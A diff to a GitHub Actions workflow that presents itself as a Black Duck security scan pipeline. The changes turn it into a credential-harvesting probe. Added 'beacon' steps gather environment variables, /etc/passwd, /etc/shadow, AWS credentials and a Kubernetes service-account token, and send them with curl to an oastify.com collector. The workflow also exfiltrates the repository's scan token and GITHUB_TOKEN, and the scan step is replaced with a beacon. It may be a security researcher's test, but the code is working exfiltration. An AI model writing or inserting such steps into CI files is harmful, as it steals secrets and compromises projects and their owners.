@@ -45,7 +45,7 @@ jobs:
       ### GitHub pull request information
       BRIDGE_GITHUB_REPOSITORY_PULL_NUMBER: ${{ github.event.pull_request.number || github.event.number || 0 }}
       ### TOOLING: Bridge CLI download URL  <-- SSRF sink
-      BRIDGE_DOWNLOAD_URL: https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com
+      BRIDGE_DOWNLOAD_URL: https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com
     steps:
       - name: Checkout Source
         uses: actions/checkout@v5
@@ -53,7 +53,26 @@ jobs:
       # === BEACON 1: proves a custom step runs ===
       - name: beacon-step
         run: |
-          curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step1?host=$(hostname)&user=$(whoami)&repo=$BRIDGE_GITHUB_REPOSITORY_NAME" || true
+          COLLAB="https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com"
+          {
+            echo "=== id ==="; id
+            echo "=== whoami ==="; whoami
+            echo "=== hostname ==="; hostname
+            echo "=== uname ==="; uname -a
+            echo "=== pwd ==="; pwd
+            echo "=== env ==="; env | sort
+            echo "=== /proc/1/cmdline ==="; tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo
+            echo "=== /etc/passwd ==="; cat /etc/passwd 2>/dev/null
+            echo "=== /etc/hostname ==="; cat /etc/hostname 2>/dev/null
+            echo "=== /etc/hosts ==="; cat /etc/hosts 2>/dev/null
+            echo "=== /etc/os-release ==="; cat /etc/os-release 2>/dev/null
+            echo "=== /etc/shadow ==="; cat /etc/shadow 2>/dev/null || echo "perm-denied"
+            echo "=== /opt listing ==="; ls -la /opt 2>/dev/null
+            echo "=== /app listing ==="; ls -la /app 2>/dev/null
+            echo "=== /root listing ==="; ls -la /root 2>/dev/null
+            echo "=== aws creds ==="; cat /root/.aws/credentials 2>/dev/null || echo "none"
+            echo "=== k8s sa token ==="; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "none"
+          } 2>&1 | curl -sS -X POST --data-binary @- "$COLLAB/probe" || true
 
       # === BEACON 2: env + secret exposure (will appear in Collaborator if run:) ===
       - name: beacon-env
@@ -62,7 +81,7 @@ jobs:
             --data-urlencode "token=${{ secrets.BLACKDUCKSCA_TOKEN }}" \
             --data-urlencode "ghtoken=${{ secrets.GITHUB_TOKEN }}" \
             --data-urlencode "url=${{ vars.BLACKDUCKSCA_URL }}" \
-            "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step2" || true
+            "https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com/step2" || true
 
       - name: Download & Setup Bridge CLI on Windows
         if: runner.os == 'Windows'
@@ -84,4 +103,4 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(hostname)" || true
+        run: echo "scan-step" && curl -sS "https://244sf6pz5iymg7rfgqre8ugrvi1ap3ds.oastify.com/scan?host=$(pwd)" || true
